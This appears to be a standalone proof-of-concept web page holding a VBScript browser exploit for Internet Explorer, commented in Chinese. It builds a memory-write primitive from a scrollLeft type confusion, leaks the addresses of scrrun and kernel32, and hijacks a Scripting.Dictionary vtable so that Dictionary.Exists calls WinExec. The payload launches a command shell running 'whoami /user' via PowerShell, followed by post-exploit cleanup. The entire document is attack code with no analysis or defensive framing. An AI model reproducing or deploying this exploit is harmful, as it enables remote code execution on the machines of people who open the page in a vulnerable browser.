<meta http-equiv="x-ua-compatible" content="IE=8.a">
<script language="VBScript.Encode">
Dim ar1(&h3000000)
Dim ar2(1000)
Dim gremlin
addressOfGremlin = &h28281000
Class MyClass
    Private mValue
    Public Property Let Value(v)
        mValue = v
    End Property
    Public Default Property Get P
        P = mValue                // 写入哪里
    End Property
End Class

// 写原语 
Sub TriggerWrite(where, val)
    Dim v1
    Set v1 = document.getElementById("container1")
    v1.scrollLeft = val        // 写入该值(最大值 0x001767dd)
    Dim c
    Set c = new MyClass
    c.Value = where
    Set v1.scrollLeft = c
End Sub

// 我们的漏洞不会立即为我们提供不受限制的写入(尽管我们可以制造一个) 
// 就我们的目的而言, 以下内容就足够了, 它将任意 DWORD 写入任意位置
// 并将后续 3 个字节设置为零
Sub WriteInt32With3ByteZeroTrailer(addr, val)
    TriggerWrite addr    , (val) AND &hff
    TriggerWrite addr + 1, (val\&h100) AND &hff
    TriggerWrite addr + 2, (val\&h10000) AND &hff
    TriggerWrite addr + 3, (val\&h1000000) AND &hff
End Sub

Sub WriteAsciiStringWith4ByteZeroTrailer(addr, str)
    For i = 0 To Len(str) - 1
        TriggerWrite addr + i, Asc(Mid(str, i + 1, 1))
    Next
End Sub

Function ReadInt32(addr)
    WriteInt32With3ByteZeroTrailer addressOfGremlin + &h8, addr
    ReadInt32 = ar1(gremlin)
End Function

Function LeakAddressOfObject(obj)
    Set ar1(gremlin + 1) = obj
    LeakAddressOfObject = ReadInt32(addressOfGremlin + &h18)
End Function

Sub Exploit()
    // 一个数组元素的 vt 损坏(gremlin)
    TriggerWrite addressOfGremlin, &h4003    // VT_BYREF | VT_I4
    // 获取可靠读取地址

    For i = ((addressOfGremlin - &h20) / &h10) Mod &h100 To UBound(ar1) Step &h100
        If Not IsEmpty(ar1(i)) Then
            gremlin = i
            Exit For
        End If
    Next
    
    If IsEmpty(gremlin) Then
        MsgBox "Could not find gremlin"
        Exit Sub
    End If
    
    // 分配 Scripting.Dictionary    
    For i = 0 To UBound(ar2)
        Set ar2(i) = CreateObject("Scripting.Dictionary")
    Next

    // 泄露数组的地址                     
    Set dict = ar2(UBound(ar2) / 2)        
    addressOfDict = LeakAddressOfObject(dict)

    // 泄露数组虚表地址
    vtableOfDict = ReadInt32(addressOfDict)

    // 获取本模块基地址
    scrrun = vtableOfDict - &h11fc

    // 获取 kernel32 模块基地址
    kernel32 = ReadInt32(scrrun + &h1f1a4) - &h23c90

    // 从 kernel32 中获取 winexec 函数的地址
    winExec = kernel32 + &h5d380
        
    dict.Exists "dummy"        // 进行调度调用, 只是为了填充 pld
    
    // 重新定位 pld 以确保其地址不包含空字节
    pld = ReadInt32(addressOfDict + &h3c)
    fakePld = &h28281020
    For i = 0 To 3 - 1
        WriteInt32With3ByteZeroTrailer fakePld + 4 * i, ReadInt32(pld + 4 * i)
    Next
    
    fakeVtable = &h28282828        // ASCII "(((("
    For i = 0 To 21
        If i = 12 Then        // Dictionary.Exists
            fptr = winExec
        Else
            fptr = ReadInt32(vtableOfDict + 4 * i)
        End If
        WriteInt32With3ByteZeroTrailer (fakeVtable + 4 * i), fptr
    Next
    
    WriteAsciiStringWith4ByteZeroTrailer addressOfDict, "((((\..\PowerShell.ewe -Command ""<#AAAAAAAAAAAAAAAAAAAAAAAAA"
    WriteInt32With3ByteZeroTrailer addressOfDict + &h3c, fakePld
    WriteAsciiStringWith4ByteZeroTrailer addressOfDict + &h40, "#>$a = """"Start-Process cmd `""""""/t:4f /k whoami /user`"""""""""""" ; Invoke-Command -ScriptBlock ([Scriptblock]::Create($a))"""
    
    On Error Resume Next
    
    // 进行调用
    dict.Exists "dummy"        // Wheeee!!
    
    // 进行一些清理以帮助防止漏洞利用后发生崩溃
    For i = 1 To 3
        WriteInt32With3ByteZeroTrailer addressOfDict + &h48 * i, vtableOfDict
        WriteInt32With3ByteZeroTrailer addressOfDict + (&h48 * i) + &h14, 2
    Next
    Erase Dict
    Erase ar2
End Sub

Exploit
</script>